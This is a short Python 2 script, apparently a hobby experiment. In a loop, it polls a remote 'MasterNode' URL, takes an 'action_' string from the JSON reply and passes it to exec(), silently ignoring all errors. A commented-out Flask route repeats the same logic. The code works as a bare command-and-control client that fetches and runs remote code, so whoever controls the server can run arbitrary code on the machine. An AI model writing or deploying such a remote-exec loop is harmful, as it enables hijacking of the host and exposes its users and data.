import requests
import time

current_action = ""
proceed = True

while (proceed):
    try:
      print "hello from inside!"
      time.sleep(1)
      response = requests.get("https://MasterNode--yevbar.repl.co")
      json_data = response.json()
      proceed = json_data["continue_"] == u'true'
      print "hello again from inside!"
      print proceed
      time.sleep(2)
      if current_action != json_data["action_"]:
        current_action = json_data["action_"]
      print current_action
      exec(current_action)
      print "did action"
    except Exception as e:
      two = 1 + 1

"""
@app.route("/")
def home():
  global current_action
  global proceed
  while (proceed):
    try:
      response = requests.get("https://MasterNode--yevbar.repl.co")
      json_data = response.json()
      proceed = json_data["continue_"] == u'true'
      print proceed
      if current_action != json_data["action_"]:
        current_action = json_data["action_"]
      print current_action
      exec(current_action)
      time.sleep(2)
    except Exception as e:
      two = 1 + 1
  return jsonify(message="Hello World!")
  
if __name__ == "__main__":
  app.run(host= '0.0.0.0', port=9000, debug=False)
"""
